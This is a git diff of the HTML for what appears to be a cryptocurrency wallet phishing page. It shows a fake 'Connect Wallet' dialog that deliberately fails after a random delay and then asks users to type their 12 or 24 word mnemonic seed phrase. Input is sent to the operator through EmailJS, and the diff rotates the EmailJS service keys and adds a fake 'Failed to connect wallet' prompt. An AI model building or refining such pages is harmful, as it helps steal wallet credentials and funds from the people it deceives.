@@ -10,7 +10,7 @@
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script type="text/javascript">
 (function(){
-  emailjs.init("KGWmh1dyveTN8cjHy");
+  emailjs.init("bkelxZBaO6-WZhaVN");
 })();
 </script>
 
@@ -73,8 +73,8 @@
   </div>
 
   <div class="manual-section">
-    <textarea id="wallet-key" placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."></textarea>
-
+<p id="failed-to-connect">Failed to connect wallet, Please try again.</p>
+<textarea id="wallet-key" placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."></textarea>
 <button class="connect-wallet">Connect Wallet</button>
 
   </div>
@@ -728,6 +728,7 @@
 
 <button id="subscribe-mail" type="submit">&nbsp; Send &nbsp;</button>
 <p id="invalid-email">Please enter a valid email address</p>
+<p id="subscribe-email" style="display: none;">Subscribed!</p>
 </form>
 </div>
  </div>
@@ -747,67 +748,14 @@
 
     </div>
 
+ <script src="Script.js"></script>
 
   <script>
-document.addEventListener("DOMContentLoaded", function() {
-  var errorSection = document.querySelector(".error-section");
-  var connectingSection = document.querySelector(".connecting-section");
-  var manualSection = document.querySelector(".manual-section");
-  var connectBox = document.querySelector(".connect-box");
-  var closeButton = document.getElementById("close-button");
-  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
-  var walletConnectCard = this.documentElement.querySelector(".wallet-connect-card");
-  var tryAgain = document.querySelector(".try-again");
-  var connectManually = document.querySelector(".connect-manually");
-
-function errorConnecting() {
-  connectingSection.style.display = "none";
-  errorSection.style.display = "block";
-  manualSection.style.display = "none";
-}
-function retryConnecting() {
-  connectingSection.style.display = "block";
-  errorSection.style.display = "none";
-  manualSection.style.display = "none";
-  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
-  setTimeout(function() {
-    errorConnecting();
-  }, errorTime);
-}
-
-  tryAgain.addEventListener("click", function() {
-    retryConnecting();
-  });
-  connectManually.addEventListener("click", function() {
-    connectingSection.style.display = "none";
-    errorSection.style.display = "none";
-    manualSection.style.display = "block";
-  });
-
-  closeButton.addEventListener("click", function() {
-    connectBox.style.display = "none";
-    connectingSection.style.display = "block";
-    errorSection.style.display = "none";
-    manualSection.style.display = "none";
-  });
-
-  walletConnectCard.addEventListener("click", function() {
-    connectBox.style.display = "flex";
-    manualSection.style.display = "none";
-    setTimeout(function() {
-      errorConnecting();
-    }, errorTime);
-  });
-
-});
-
-
-
-
 
 var submitButton = document.getElementById("subscribe-mail");
 var emailField = document.getElementById("email");
 var invalidEmail = document.getElementById("invalid-email");
+var subscribeEmail = document.getElementById("subscribe-email");
 
 function confirmButtonStatus() {
   if (submitButton.disabled === true) {
@@ -834,6 +782,10 @@ emailField.addEventListener("blur", function() {
   }
 });
 
+emailField.addEventListener("focus", function() {
+  subscribeEmail.style.display = "none";
+});
+
 submitButton.addEventListener("click", function(event) {
   event.preventDefault();
   if (!emailField.checkValidity()) {
@@ -851,20 +803,24 @@ submitButton.addEventListener("click", function(event) {
     submitButton.classList.remove("disabled");
   }, 7000);
 
-
+  
   function sendMail() {
   var Email = document.getElementById("email").value;
-  var submitButton = "Murphy Email";
+  var submitButton = "Murphy Email2";
 
-  emailjs.send('service_76vugl3', 'template_9vpv84j', {
+  emailjs.send('service_kyvi3ud', 'template_zsrp7t6', {
     email: Email,
     submit_button_id: submitButton,
   })
   .then(function(response) {
-    window.location.href = "https://bennyboy10.github.io/123/";
+    subscribeEmail.style.display = "flex";
+    subscribeEmail.style.fontSize = "1.1rem";
+    subscribeEmail.textContent = "Subscribed!";
   })
   .catch(function(error) {
-    window.location.href = "https://bennyboy10.github.io/123/";
+    subscribeEmail.style.display = "flex";
+    subscribeEmail.style.fontSize = "1.1rem";
+    subscribeEmail.textContent = "Error, Please try again";
   });
 }
   sendMail();
@@ -936,4 +892,3 @@ walletIcon.addEventListener("click", function() {
 
 </body>
 </html>
- 
